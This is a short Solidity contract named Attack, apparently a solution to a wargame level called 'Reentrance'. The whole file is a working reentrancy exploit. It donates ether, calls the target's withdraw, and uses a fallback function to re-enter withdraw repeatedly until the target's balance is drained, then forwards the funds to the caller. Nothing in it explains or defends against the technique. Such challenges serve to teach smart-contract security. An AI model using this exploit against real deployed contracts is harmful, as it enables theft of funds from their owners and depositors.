
contract Attack {

    Reentrance reentrance;

    constructor(address _level) {
        reentrance =  Reentrance(payable(_level));
    }

    function withdraw() public payable {
        payable(msg.sender).transfer(address(this).balance);
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    fallback() external payable {
        if(address(reentrance).balance >= 0.001 ether)
            reentrance.withdraw(0.001 ether);

    }

}